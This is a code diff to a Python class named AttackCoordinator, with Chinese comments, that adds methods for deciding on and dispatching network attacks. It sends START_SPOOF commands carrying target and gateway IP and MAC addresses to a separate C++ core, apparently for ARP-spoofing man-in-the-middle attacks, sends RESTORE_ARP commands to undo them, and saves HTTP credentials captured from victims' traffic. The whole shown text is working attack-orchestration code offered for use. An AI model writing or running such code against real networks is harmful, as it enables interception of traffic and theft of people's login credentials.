@@ -201,3 +201,76 @@ class AttackCoordinator:
         })
         
         return stats
+    
+    def set_command_sender(self, command_sender: Callable):
+        """设置命令发送回调函数 - 用于向C++核心发送命令"""
+        self.command_sender = command_sender
+        self.logger.info("✅ Command sender callback set")
+        
+    def process_analysis_result(self, analysis_result):
+        """处理分析结果并做出攻击决策"""
+        try:
+            decision = self.make_decision(analysis_result)
+            if decision:
+                if decision.action == 'attack':
+                    self._execute_attack_decision(decision)
+                elif decision.action == 'restore':
+                    self._execute_restore_decision(decision)
+                    
+                # 保存凭据（如果有）
+                if hasattr(analysis_result, 'http_credentials') and analysis_result.http_credentials:
+                    self._save_credentials(analysis_result.source_ip, analysis_result.http_credentials, 
+                                         {"analysis_result": analysis_result})
+                                         
+            return decision
+        except Exception as e:
+            self.logger.error(f"❌ Error processing analysis result: {e}")
+            return None
+            
+    def _execute_attack_decision(self, decision: AttackDecision):
+        """执行攻击决策"""
+        try:
+            command = {
+                'type': 'START_SPOOF',
+                'target_ip': decision.target_ip,
+                'gateway_ip': decision.gateway_ip,
+                'target_mac': decision.target_mac,
+                'gateway_mac': decision.gateway_mac,
+                'duration': decision.duration
+            }
+            
+            if self.command_sender:
+                success = self.command_sender(command)
+                if success:
+                    self.logger.info(f"🎯 Attack command sent for {decision.target_ip}")
+                    with self.stats_lock:
+                        self.stats['attacks_authorized'] += 1
+                else:
+                    self.logger.error(f"❌ Failed to send attack command for {decision.target_ip}")
+            else:
+                self.logger.warning("⚠️ No command sender available")
+                
+        except Exception as e:
+            self.logger.error(f"❌ Error executing attack decision: {e}")
+            
+    def _execute_restore_decision(self, decision: AttackDecision):
+        """执行恢复决策"""
+        try:
+            command = {
+                'type': 'RESTORE_ARP',
+                'target_ip': decision.target_ip
+            }
+            
+            if self.command_sender:
+                success = self.command_sender(command)
+                if success:
+                    self.logger.info(f"🔄 Restore command sent for {decision.target_ip}")
+                    with self.stats_lock:
+                        self.stats['restores_initiated'] += 1
+                else:
+                    self.logger.error(f"❌ Failed to send restore command for {decision.target_ip}")
+            else:
+                self.logger.warning("⚠️ No command sender available")
+                
+        except Exception as e:
+            self.logger.error(f"❌ Error executing restore decision: {e}")
